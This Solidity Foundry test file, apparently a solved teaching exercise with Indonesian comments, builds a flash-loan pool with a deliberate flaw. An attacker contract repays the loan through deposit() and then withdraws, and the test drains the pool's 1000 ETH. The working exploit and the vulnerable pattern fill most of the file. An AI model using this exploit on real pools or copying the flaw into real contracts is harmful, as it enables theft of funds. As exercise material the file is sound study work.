// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// 1. TARGET: SIDE ENTRANCE POOL
contract SideEntranceLenderPool {
    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        
        // Panggil fungsi 'execute' di peminjam
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require(address(this).balance >= balanceBefore, "Flash loan not repaid");
    }
}

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

// 2. ROBOT JAHAT (ATTACKER CONTRACT)
// Kita harus bikin kontrak ini untuk menampung uang dan melakukan deposit
contract SideEntranceAttacker is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    address owner;

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        owner = msg.sender;
    }

    // Fungsi pemicu serangan (Ditekan oleh Hacker)
    function attack() external {
        // Cek saldo pool dulu
        uint256 poolBalance = address(pool).balance;
        
        // Mulai Flash Loan sebesar seluruh isi pool
        pool.flashLoan(poolBalance);

        // Setelah flash loan selesai (dan sukses deposit),
        // Kita tarik uangnya dari Pool ke kontrak ini
        pool.withdraw();

        // Lalu kirim ke Hacker (Owner)
        payable(owner).transfer(address(this).balance);
    }

    // Fungsi ini dipanggil otomatis oleh Pool saat flash loan cair
    // Uang 1000 ETH masuk ke sini
    function execute() external payable override {
        // ---------------------------------------------------------
        // TUGASMU: KELABUI BANK DI SINI!
        // Kamu sedang memegang uang pinjaman (msg.value).
        // Jangan dikembalikan lewat transfer biasa.
        // Kembalikan lewat pintu samping (deposit).
        // ---------------------------------------------------------

        // Tulis 1 baris kode di sini untuk deposit ke pool:
        // pool....
        pool.deposit{value: msg.value}();


        // ---------------------------------------------------------
    }

    // Biar kontrak ini bisa terima ETH dari withdraw
    receive() external payable {}
}

// 3. TEST SCRIPT
contract SideEntranceTest is Test {
    SideEntranceLenderPool pool;
    SideEntranceAttacker attackerContract;

    function setUp() public {
        pool = new SideEntranceLenderPool();
        
        // Bank punya modal 1000 ETH
        vm.deal(address(pool), 1000 ether);

        // Deploy Robot Jahat
        attackerContract = new SideEntranceAttacker(address(pool));
    }

    function test_SideEntrance_Attack() public {
        console.log("Pool Balance Before:", address(pool).balance / 1 ether);
        console.log("Attacker Balance Before:", address(this).balance / 1 ether);

        // JALANKAN SERANGAN
        attackerContract.attack();

        console.log("Pool Balance After:", address(pool).balance / 1 ether);
        console.log("Attacker Balance After:", address(this).balance / 1 ether);

        // VERIFIKASI: Bank Kering, Kita Kaya
        assertEq(address(pool).balance, 0);
        assertGt(address(this).balance, 1000 ether); // Harusnya saldo kita nambah 1000
    }
    
    // Biar test script ini bisa nampung duit hasil rampokan
    receive() external payable {}
}